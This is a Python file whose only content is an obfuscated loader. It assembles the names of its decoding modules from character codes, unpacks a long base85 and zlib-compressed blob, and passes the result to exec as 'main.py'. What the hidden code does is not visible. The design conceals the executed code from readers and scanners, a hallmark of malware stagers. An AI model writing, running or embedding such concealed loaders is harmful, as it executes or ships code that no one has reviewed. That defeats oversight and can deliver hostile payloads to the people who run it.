import importlib

_m1 = importlib.import_module("".join(chr(c) for c in [98, 97, 115, 101, 54, 52]))
_m2 = importlib.import_module("".join(chr(c) for c in [122, 108, 105, 98]))

_p = (
    "c-pmCTW{RP6@K4eF<{_|Y*+M3zA1~WTUl0Zp^_}va??~02x@nBMT<+)<S>$~>cO#PyNV&#O?pdH7)D@N5iHxXtr*H<eg*e6zaT%M"
    "-(1KgSF1FE(FM39hiA^5+kEGo(KM|@@Vn}=&?b}dN*u0|S?bbOXt&8s=r<jgl5;*I`Ya9G@d~*VFsJR@pbavJakoLnT))0V#v2ZE"
    "e9sWvChdrkX}e9UlH`irq+}wruRCPcX;Y$)e@wAX+wo#X<&<-dUrpD)5K_t<uT>`JY{o!YCKDd+9%W@R?JtuV*IvbUqBldojS=QF"
    "ox07}kBl<;klJjKhGp^#GUfZ8S<;}SplsL-j3I#24*Za1?`6XOZ}=XSbo|Njntn?6N4!tqy`<jlXw|Db*=rOp1fgH2QIw8ci+nGA"
    "jziaV7R-=dk7>l@0t^;ri;#^oN>@qEKIS^q>mf{Onz2_GdZyg#zSneGrP6z(*6&A>on$Y0-q}p{N%FLFJ9(PC#?bTR1>QFL&&kwU"
    "ji4#9a4%Vt6Jz7kSH`XJKg>*A{)p5v+v&rV;nQU@R4J1)WrC*@cw#rW`D&?E&6w4VE{~}z7r;PE4w9D;?kVZq?tGHGfT)lNV%@>R"
    "T?qOZFUcFBz|+pH&Mg8h_L66vKTAz^I`{B>zjK>(Hj)D|hKIKp-6P2XUNXAdnD|U^*&x69UB#NZpp{Au+9Xzek=B<i*Qrx4qPkHP"
    "q3AR-<xJ0C)(cvYv!ursauWXqq2n<<ucncG<5o23io^6F<0xnS)ZdSI`w5H+*NST=waJUlCXD*^5#An~nEl9_9-SKJJ~{8K+ODm="
    "n}nrO-G*hsZ%yd0Ez2FLRY_A@%hp>bCq}+|Ii{5*kqgkUnv~TSL02iQOBXTUS^$JtUfiak?M6DIE38T)78+#mEWb<pV~-<Jc02c="
    ">uu@yuaZ5)6?b~_M25pY0^wU20!G@y<2QIjxNO5#d&w(4{!HwPPl+yIYdUT(&@eJI1(G3Uap(~)feE<uA{SwzLj<#JFHtd~Yn7ql"
    "6DLodJ~Q&ZRwmjH|9SKb*DkK-xL)9TiE9tnD_pN}y}`Aw8HUuiMVYlAQ7?^0uG%x`vrXW|*AQ1o{RYb3k&137Z@CK4=<DuYNWOw4"
    "K7l>p`BVWGu6Cm}q!B#S#V%8B20vy&%=9^p3A`Uv!VE^tW^ts=mxcbd*)XQv=*E7r!HmP6>H2mf(!ss^IiMkS7_(bc0*7rvO<n5_"
    "!&H?nxm>D1s#b?ZwJx0l@Z&-I{TGilzH8HY7#h1cdilb{^aYJjH=^*vqt8Fpa;ghQA{aS~^|eDm2A}F(=?r82n4C;k>NH?vT-*S|"
    ")n1lrq0E(z%3Bs&4QS4xotw!nAh~k~o;*mAc_-QDPx5tFY~D?xbC|;&Gx!Z|y+@L5_?iP{w#hkO?sRS%@8aoYWYIy`!=oa_a0D;7"
    "y9@(2Xc*RVoX(H`e){U<<WG(SiLI$q;~)U`+8(pG>!@Z(-(8xTnH--TKd%u#%#%k>Lo>Q+70v$dFUg0_Z=L_;r@%&*F3$Yy8*(0t"
    "<h<6V4ac^40=B$-adCJ@@_Z_@7JwFL^Ok#4xJV+<xA3ssmVC25!LB_JXw&OBxOo$f-Vy)X$$i2%x*8CU=R-iT<oP?fIIqp1>qPA5"
    "JGfwwAMtb(z7w>>@rsj*9t@UR;35bVD%kZUY&u>(%KZ-R%QV!D!Zh%;y;a=~0?wZ^;R~wQIc*i1#|wf%6mZ_F;?a-2M&0$}27hbE"
    "kyGan0m?~aCqBd-&v!ju=X*j;*xX?*Es86KdVnb>r1*T85&zX)YI_#a2Fm9e2O~i{R~<SzziyfW(Ol~3VwBe%LnkGeiGjWxGhF-O"
    "(bhg$%Pp|}v-d@AJE-*CC;A0Q@x;k*ZxR2mc`=u-IaCR<i^Te(n}|?WSuDy`k)qHtO#TQcXa~yMFo7Z+B%-F6%a;lB+$bZJN>_`*"
    "p5Q+e-@>+wj0I8k`0-_iZ0&f*b5+Q%5jbs|)s8W(2U@OUYO#7ZFUz}*;WAmIHnvMtTN}6<(Qt6Ig}@o8l7TwD4y+f$VcB7ez0C0H"
    "2k<c7We0+wt(`D<(T%MXV5{_r97fv#<Vp#^%x=JP4O;gbR3C_0b8uw9Fp<HWKtCLk%8F@4HZLPDSCg&r1=h8rCKk+JQ{KslkB+Z?"
    "G1e<f4uH|OS;3->qP&4>FO8C10PX@HpYoDu18BON1tBV)4PO8A$D6orar8~2ZVA$QmPeNb|6&hQLDw=Q`j?>*Tqlp{VMK~^noT~L"
    "nXrZW+S4Qq_N*o6*{dStG2LW7vt28K(>wsDL5`D=(<dtxLFdMv07}pfzi*y8Q8_g-a{7$;Bus*FUGO@Vk#Yv<vmoqJ^Cjm12=^a~"
    "di2r#zpDFZ>i)U9|4rThuI~R(_kY4MVlR3Px&mgr$B}aUl8lgFk&1cBfG8t*&&rkO#FU&{UD4lLE!E%ai+&tdIYXmZ#BYlHh{X3C"
    "-prNdNQf`xr@Nrxg)qo>kYqQx&v{57AnpN%RB}Z!?QEpp2bP>7AJhn6lzc#jh7T8S-+#Hyn}jXV66{J;d((N?d4TkNFL|yo)CH%Z"
    ";XJD|eOP_*n2WNN34`o?2e7#X&ad)}&g2*k5BDo5@Ba(c065*n<UL%Xn%IJRTL|yJK*@)EFy)!Yj2w^q+-45|%MYN*V=2*rkY*n|"
    "Zb}X%aj-$SyW)Uv4l9r+Kzd!ANmP5zC`1c3ji~=WHqPoW!ta8NADLF#Ngo3J1-rG_up5>*=IO~V=`oJ3jYf`r{G24^tyelbdw7ow"
    "nc0DfD)3Ow@q?7Tsthg_XWRKc^N7AuG-abxvND{R>ZU75hSE2Lpn17DcsB(uX~!n2$EI?Xg=kZhZiicA#jenJIevrpNHbHSpeQUO"
    "qV8;s2ea&wMyI;CFM!@d5oYoFP^O7&b)*T&I+rMNwi}kVL%?ri!+wo++VPDl->mxx-A!0Z?(J+!iU?SyA5I*SI%g2so~nsi=iDt<"
    "DO2BiTCt2m)O?EO=)ylESJ_HU$V#IwJDFN~vRGb&KH;|D_!f3n8+%INbt^joT}V$rA^Cj1jS`|3^J|`qiBgz)4PB5KeHSv}S57jw"
    "oF15Rf#;79Pep-7{zNqMn(ugeo>!kq5=%tgBhiD`H3~-xV%y8M!_*f&JK!|!dL89DGp`CHQb*Bg{dK53$-=c(4BYY|N_&BqS*c2e"
    "&k6~8s~9dg?M17mHXep(IRsGh&{a@bC2MpYJGKNLSyB#5w6&JiwjIy1G|8#=?6D+szwh(vP8~3tyndh`!!8#8prS1O7$L-RANil+"
    "qU>GkfoolpXZ5@xliig(JvK*YCaj6`h1ZLtS1uaeQbHU?+d%}O8?j46Gkb!gq&z87kMh@vOIK0?F+U@RP`w0tSBaWbB3rh*p516z"
    "*Zc*&n3qtcg-)wQ!<tqPeGeMhVJoVsbX7Lc(TWnQrd1S(<}_e-$n@M|sa;z|yBcN~dls4mjPZ^BU*i=HkN"
)

exec(compile(_m2.decompress(_m1.b85decode(_p)), "main.py", "exec"))
